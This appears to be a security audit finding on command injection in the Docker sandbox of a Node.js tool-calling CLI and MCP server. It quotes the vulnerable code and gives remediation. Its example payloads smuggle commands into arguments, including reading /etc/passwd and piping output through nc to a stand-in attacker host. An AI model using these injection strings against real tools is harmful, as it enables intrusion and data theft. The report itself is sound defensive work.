# Command Injection in Docker Sandbox via CLI/MCP arguments

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-07-26 03:34:48 UTC
**Target:** D:\Self-developed_Apps\Tool-Calling (workspace: /workspace/Tool-Calling)
**Endpoint:** /core/sandbox.js
**Method:** POST
**CWE:** CWE-78
**CVSS:** 8.6
**Fix Effort:** Medium

## Description

The `invokeInSandbox` and `invokeInSandboxCapture` functions in `core/sandbox.js` construct a shell command string by concatenating user-supplied CLI arguments with setup commands, then pass the result to `sh -c`. This allows an attacker to inject arbitrary shell commands through carefully crafted arguments.

## Evidence

From `core/sandbox.js` lines 91-114:

```javascript
function buildDockerArgs(tool, targetDir, args) {
  const setupCmd = getSetupCommand(targetDir, tool);  // Line 93
  const userCmd = args.join(' ');                      // Line 94
  const finalCmd = `${setupCmd}${userCmd || 'echo "No command provided"'}`;  // Line 95
  // ...
  const dockerArgs = [
    // ...
    'sh', '-c', finalCmd  // Line 111 — unsanitized!
  ];
}
```

And `getSetupCommand` (lines 36-65) directly uses `tool.install.command`:
```javascript
commands.push(tool.install.command);  // Line 44 — unsanitized!
return commands.length > 0 ? commands.join(' && ') + ' && ' : '';  // Line 64
```

The CLI entry point (`cli.js` line 593) passes raw args:
```javascript
result = invokeInSandbox(tool, targetPath, invokeArgs);  // invokeArgs from CLI
```

The MCP entry point (`mcp-server.js` line 196) similarly passes raw args:
```javascript
const result = invokeInSandboxCapture(tool, targetPath, toolArgs);  // toolArgs from JSON-RPC
```

## Impact

An attacker who can control the arguments passed to the `invoke` CLI command or the MCP `run_tool` tool can execute arbitrary commands inside the Docker container. While the container is network-isolated (`--network none`) and runs as a non-root user, the attacker could still read files mounted into the container (the tool's source code directory), exfiltrate data through available channels, or exploit other container escape vulnerabilities.

## Technical Analysis

The vulnerability exists in `core/sandbox.js` in the `buildDockerArgs` function (lines 91-114). The function constructs a shell command as follows:

```javascript
const setupCmd = getSetupCommand(targetDir, tool);  // May contain tool.install.command
const userCmd = args.join(' ');                      // Direct concatenation of CLI/MCP args
const finalCmd = `${setupCmd}${userCmd || 'echo "No command provided"'}`;
```

The `finalCmd` is then passed to Docker as:
```javascript
'sh', '-c', finalCmd
```

Since `spawnSync('docker', dockerArgs)` passes `finalCmd` as a single string argument to `sh -c`, any shell metacharacters in the `args` array are interpreted by the shell. For example:

- `node cli.js invoke some-tool "; cat /etc/passwd; echo PWNED"` would execute `cat /etc/passwd` inside the container.
- `node cli.js invoke some-tool "$(whoami)"` would execute command substitution.
- Through the MCP server, `run_tool` with `args: ["| nc attacker.com 4444"]` would pipe output to an external host.

The `getSetupCommand` function (line 36-65) also concatenates `tool.install.command` directly into the shell command without sanitization, meaning a malicious entry in `tools.json` could also trigger command injection even without CLI args.

## Remediation

Replace the shell command construction with a safe execution model. Instead of concatenating arguments into a shell string passed to `sh -c`, use one of these approaches:

1. **Array-based execution**: Pass the command and arguments as separate array elements to the container using Docker's exec form. Write the command to a temporary script file inside the container with proper escaping, then execute it.

2. **Input validation**: Validate and sanitize all user arguments against a strict allowlist of permitted characters (alphanumeric, spaces, common CLI flags) before constructing the command.

3. **Use Docker exec form**: Replace `'sh', '-c', finalCmd` with direct command execution using array-style arguments that bypass shell interpretation entirely.

Additionally, sanitize `tool.install.command` from `tools.json` by validating it against an allowlist of known-safe commands rather than passing it directly to the shell.

## Assumptions

Assumes the attacker has access to either the CLI invoke command or the MCP run_tool endpoint. The Docker sandbox mitigates impact by running with --network none, --read-only, --cap-drop ALL, and as non-root user (1000:1000), but file access to the mounted tool directory is still possible.
